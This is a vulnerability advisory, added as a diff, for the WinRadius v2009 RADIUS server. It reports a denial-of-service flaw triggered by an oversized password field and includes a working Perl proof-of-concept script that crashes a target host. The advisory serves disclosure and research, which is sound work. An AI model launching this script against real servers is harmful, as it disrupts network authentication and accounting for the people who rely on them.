@@ -1,0 +1,42 @@
+Title: WinRadius Server Denial Of Service Vulnerability
+Software : WinRadius
+
+Software Version : v2009
+
+Vendor: http://www.elite-school.com/saas/WinRadius/
+
+Vulnerability Published : 2012-05-27
+
+Vulnerability Update Time :
+
+Status : 
+
+Impact : Medium(CVSS2 Base : 5.0, AV:N/AC:L/Au:N/C:N/I:N/A:P)
+
+Bug Description :
+WinRadius is a standard RADIUS server for network authentication, accounting. It's easy to use, and can be used for telecommunication accounting platform, PPP authentication, accounting server. It support PPP, PPPoE, PPTP, VPN, VoIP, ADSL, Cable Modem, CDMA, GSM, GPRS, WLAN(802.1x), etc.
+WinRadius server would bind udp port 1812 and 1813, but it does not validate the password option size leading to a Denial Of Service flaw while sending more than 240 characters to it.
+
+Proof Of Concept :
+-----------------------------------------------------------
+#!/usr/bin/perl
+use Authen::Simple::RADIUS;
+$|=1;
+$host=shift || die "usage: $0 host\n";
+print "Launch Attack ... \n";
+$username=int(rand(10)).int(rand(10)).int(rand(10));
+$password='A'x241;
+$secret=int(rand(10)).int(rand(10)).int(rand(10));
+$radius = Authen::Simple::RADIUS->new(
+   host   => $host,
+   secret => $secret
+);
+$radius->authenticate( $username, $password );
+print "Finish!\n";
+exit(1);
+-----------------------------------------------------------
+
+Credits : This vulnerability was discovered by demonalex(at)163(dot)com
+mail: demonalex(at)163(dot)com / ChaoYi.Huang@connect.polyu.hk
+Pentester/Researcher
+Dark2S Security Team/PolyU.HK
